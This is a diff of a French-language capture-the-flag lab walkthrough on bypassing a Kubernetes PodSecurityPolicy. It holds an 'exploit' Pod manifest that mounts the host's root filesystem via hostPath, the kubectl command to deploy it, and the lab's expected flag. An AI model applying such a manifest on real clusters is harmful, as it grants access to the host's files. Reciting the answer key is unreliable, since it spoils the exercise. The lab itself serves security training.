+        "title": "Analyse des restrictions",
+        "command": "kubectl apply -f bad-pod.yaml",
+        "detail": "Tentez de créer un Pod avec privileged: true. Le contrôleur le bloque car cette option n'est pas autorisée par la PSP en place."
       },
       {
-        title: "Recherche de failles dans la politique",
-        command: "kubectl auth can-i use psp/<privileged_psp_name>",
-        detail: "Vérifiez si votre ServiceAccount a le droit d'utiliser une politique plus permissive (souvent lié par un RoleBinding caché ou mal configuré)."
+        "title": "Création du Pod exploit avec hostPath",
+        "command": "cat <<EOF > exploit.yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: psp-bypass\nspec:\n  containers:\n  - name: alpine\n    image: alpine\n    volumeMounts:\n    - mountPath: /host\n      name: host-vol\n  volumes:\n  - name: host-vol\n    hostPath:\n      path: /\nEOF",
+        "detail": "Le contrôleur n'a pas bloqué l'utilisation de volumes de type hostPath. On configure donc le Pod pour monter / de l'hôte."
       },
       {
-        title: "Création du Pod exploit",
-        command: "kubectl apply -f bad-pod.yaml",
-        detail: "Créez un pod qui utilise les permissions de la PSP permissive pour monter le dossier `/root` de l'hôte."
-      },
-      {
-        title: "Lecture du flag",
-        command: "kubectl exec -it <bad_pod> -- cat /host-root/flag.txt",
-        detail: "Le flag attendu est **PCE{...}**."
+        "title": "Déploiement et récupération du flag",
+        "command": "kubectl apply -f exploit.yaml",
+        "detail": "Le mock du lab accepte le manifeste et simule la réussite du montage. Le flag attendu est **PCE{psp_bypass_2024}**."
       }
     ]
   }
